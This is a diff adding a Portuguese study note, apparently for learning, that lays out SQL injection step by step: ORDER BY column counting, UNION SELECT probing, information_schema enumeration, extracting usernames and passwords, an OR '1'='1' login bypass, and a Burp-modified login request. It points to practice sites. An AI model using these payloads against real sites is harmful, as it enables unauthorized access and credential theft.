@@ -1,0 +1,70 @@
+1 - Descobrir o número de colunas com ORDER BY
+
+Identificar quantas colunas a consulta original tem:
+
+ORDER BY 1 --
+ORDER BY 2 --
+ORDER BY 3 --
+
+O que observar?
+
+Quando a página funciona corretamente, o número está correto
+Quando dá erro, excedeu o número de colunas
+
+
+2 - Encontrar colunas visíveis com UNION SELECT
+
+Identificar quais colunas retornam dados visíveis na página
+
+Payload: UNION SELECT 1,2,3
+
+O que observar?
+
+Se algum número aparecer na página, a coluna é refletida e pode ser usada para exibir dados futuros.
+
+
+3 - Identificar Database:
+
+UNION SELECT database(), NULL, NULL, NULL --
+
+O nome do banco de dados será exibido nas colunas refletidas.
+
+
+4 - Enumerar tabelas e colunas via information_schema
+
+A maioria dos bancos de dados possui a tabela information_schema.tables
+
+Payload para listar tabelas:
+
+UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database() --  
+
+Retorna uma lista de nomes de tabelas existentes no banco de dados atual.
+
+Descobrir colunas de uma tabela específica: (Depois de descobrir a coluna "users")
+
+' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users' --  
+
+
+5 - Extrair dados sensíveis:
+
+UNION SELECT username,password,NULL FROM users -- 
+SELECT * FROM users WHERE username = '' OR '1'='1' --
+OR '1' = '1' (sempre torna a consulta verdadeira)
+
+
+
+Exemplo de interceptação: 
+
+
+POST /login HTTP/1.1
+Host: www.siteteste.com
+Content-Type: application/x-www-form-urlencoded
+username=admin&password=senha123
+
+Modificar no Burp Suite para testar um payload:
+
+username=admin' UNION SELECT 1,2,3 --&password=senha123
+
+Para testes: http://www.itsecgames.com/
+https://www.hackthissite.org/
+
